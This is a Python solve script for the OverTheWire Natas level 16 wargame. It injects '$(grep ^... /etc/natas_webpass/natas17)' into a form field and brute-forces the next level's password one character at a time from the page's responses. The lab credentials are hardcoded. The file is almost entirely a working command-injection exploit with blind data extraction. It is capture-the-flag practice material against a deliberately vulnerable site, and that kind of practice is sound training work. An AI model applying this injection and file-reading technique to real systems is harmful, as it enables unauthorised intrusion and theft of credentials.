from pwn import *
import requests
import re
from string import *


username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
url = "http://{}.natas.labs.overthewire.org".format(username)
characters = ascii_lowercase + ascii_uppercase + digits

log.progress("Getting the natas17 password, Hold on! ")
session = requests.session()
#web = session.get(url , auth = (username, password)).text

seen_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9"		# if you want from beginning make this string empty
while True:
    for ch in characters:
        #print("Trying with the character " + seen_password + "\t" + ch)
        web = session.post(url , data= {"needle" : "anythings$(grep ^" + seen_password + ch + " /etc/natas_webpass/natas17)"} , auth = (username, password)).text
        content = re.findall("<pre>\n(.*)\n</pre>", web)
        if content == []:
            seen_password += ch
            break
    if (len(seen_password) == 32):
        break

print("The password for natas 17 is === " + seen_password)